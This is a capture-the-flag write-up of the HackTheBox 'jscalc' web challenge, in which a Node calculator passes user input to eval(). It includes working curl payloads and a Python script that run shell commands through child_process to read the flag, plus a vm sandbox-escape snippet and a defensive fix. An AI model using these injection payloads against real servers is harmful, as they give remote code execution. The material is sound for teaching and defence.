## Overview

**jscalc** is an Easy HackTheBox **Web** challenge. It exposes a JavaScript calculator
that takes a `formula` and returns the result. The catch: the server computes it with
Node's `eval()` and **no sandbox**, so any JavaScript you submit runs server-side. That
makes it an [eval injection](https://cwe.mitre.org/data/definitions/95.html) — straight
to remote code execution as `root`.

## The technique

The calculator endpoint accepts `POST /api/calculate` with a JSON body
`{"formula": "..."}`. The helper that "computes" it is:

```js
// challenge/helpers/calculatorHelper.js
calculate(formula) {
  return eval(`(function() { return ${formula} ;}())`);
}
```

There is no `vm`/`vm2` isolation and no allow-list — `formula` is dropped directly into
a `return <here>;` **expression position**. So you don't even have to break out of any
syntax: just send a JavaScript expression whose value is the output of a shell command.

The Node-specific trick is reaching `require`. It isn't a free variable inside the eval
scope, but Node always exposes it indirectly:
`global.process.mainModule.require('child_process')` — `process` is a global and
`mainModule` is the entry module, which carries a live `require`.

## Solution

Probe first to confirm the field is evaluated, not validated:

```bash
curl -s -X POST "http://<host>:<port>/api/calculate" \
  -H 'Content-Type: application/json' -d '{"formula":"7*7"}'
# -> {"message":49}
```

Then escalate to RCE. The flag is copied to `/` in the Dockerfile (`COPY flag.txt /`):

```bash
curl -s -X POST "http://<host>:<port>/api/calculate" -H 'Content-Type: application/json' \
  -d '{"formula":"global.process.mainModule.require(`child_process`).execSync(`id`).toString()"}'
# -> {"message":"uid=0(root) gid=0(root) ..."}

curl -s -X POST "http://<host>:<port>/api/calculate" -H 'Content-Type: application/json' \
  -d '{"formula":"global.process.mainModule.require(`child_process`).execSync(`cat /flag*`).toString()"}'
# -> {"message":"HTB{...}"}
```

A small script makes it repeatable:

Create `solve.py`:

```python
import sys, requests
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

def run(cmd):
    formula = ("global.process.mainModule.require('child_process')"
               f".execSync({cmd!r}).toString()")
    return requests.post(f"{base}/api/calculate",
                         json={"formula": formula}, timeout=15).json()["message"]

print(run("id"))
print(run("cat /flag*"))
```

```bash
python3 solve.py <host> <port>
# uid=0(root) gid=0(root) ...
# HTB{...}
```

## Why it worked

The application treated user input as *code* instead of *data*. `eval()` has no safe
escaping — once attacker text reaches it, the only question is what to run. Backticks in
the JavaScript payload avoid fighting with the JSON quoting, and `mainModule.require`
reaches `child_process` even though `require` isn't directly in scope. The Node process
ran as `root` in the container, so the command output (including the flag) came right
back in the JSON response.

## Fix / defense

Never `eval()` user input. Use a real expression parser with a locked-down scope, and
validate against a strict numeric/operator allow-list:

```js
const { evaluate } = require('mathjs');
calculate(formula) {
  if (!/^[-+*/().0-9\s]+$/.test(formula)) return 'bad';
  return evaluate(formula);   // parses math, never executes JS
}
```

Note that even `vm`/`vm2` sandboxes are escapable
(`this.constructor.constructor('return process')()`), so a real parser or allow-list is
the only safe answer — and the process should run as a non-root user regardless.
